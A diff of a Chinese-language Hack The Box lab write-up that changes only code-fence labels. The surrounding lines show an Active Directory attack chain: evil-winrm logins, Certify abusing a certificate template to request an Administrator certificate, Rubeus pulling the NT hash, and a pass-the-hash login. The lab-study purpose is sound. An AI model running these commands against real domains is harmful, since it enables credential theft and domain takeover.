@@ -698,7 +698,7 @@ Module advanced options (auxiliary/admin/mssql/mssql_enum):
 
 真是对 `evil-winrm` 不熟悉，忘了可以试试这个啊……  
 试了一下，顺利get shell：
-```bash
+```powershell
 └─$ evil-winrm -i ${HTB_IP} -u sql_svc -p REGGIE1234ronnie                
 
 Evil-WinRM shell v3.4
@@ -805,7 +805,7 @@ meterpreter > getsystem
 
 ## flag: user
 
-```bash
+```powershell
 └─$ evil-winrm -i ${HTB_IP} -u Ryan.Cooper -p NuclearMosquito3
 
 Evil-WinRM shell v3.4
@@ -833,12 +833,12 @@ de9e……cb29
 然而我也第一次搞这个没有编译环境，尝试搜搜别人编译好的，于是在github发现[这个](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)。  
 下载之后可直接上传。
 
-```
+```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> upload Certify.exe
 ```
 
 本来图方便直接用sql用户的Meterpreter上传执行来着，结果说没有发现。后来用这个用户就有漏洞了。
-```
+```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./Certify.exe find /vulnerable
 
    _____          _   _  __
@@ -918,7 +918,7 @@ Certify completed in 00:00:10.4285047
 - 通过 `net group "domain users" /domain` 我们也可以确认当前Ryan账户属于这个组
 
 继续，依样画葫芦。对此模板申请一个新证书，指定“Administrator”作为Subject Alternative Name ([SAN](https://sccm.jp/2023/02/23/post-5106/), i.e. as a DA - 域管)：
-```
+```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
 
    _____          _   _  __
@@ -992,7 +992,7 @@ cert.pem  cert.pfx
 
 于是重新弄了一遍，将“localadmin” 替换为“Administrator”之后就成功了。
 
-```
+```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx
 
    ______        _
@@ -1059,7 +1059,7 @@ cert.pem  cert.pfx
 
 > [Requesting a ticket using a certificate and using `/getcredentials` to retrieve the NT hash](https://github.com/GhostPack/Rubeus#asktgt)
 
-```
+```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
 
 ……
@@ -1080,7 +1080,7 @@ cert.pem  cert.pfx
 
 ## flag: root
 
-```
+```powershell
 └─$ evil-winrm -i ${HTB_IP} -u Administrator -H A52F…………F4EE
 
 Evil-WinRM shell v3.4
